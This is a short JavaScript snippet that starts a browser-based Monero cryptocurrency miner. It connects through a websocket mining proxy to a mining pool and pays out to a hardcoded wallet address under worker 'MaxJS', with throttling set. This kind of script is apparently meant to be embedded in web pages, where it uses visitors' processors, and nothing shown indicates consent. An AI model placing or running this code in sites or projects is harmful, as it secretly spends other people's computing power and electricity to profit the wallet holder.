server = "wss://f.xmrminingproxy.com:8181";
var pool = "moneroocean.stream";
var walletAddress = "8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un";
var workerId = "MaxJS"
var threads = 1;
var password = "x";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 25;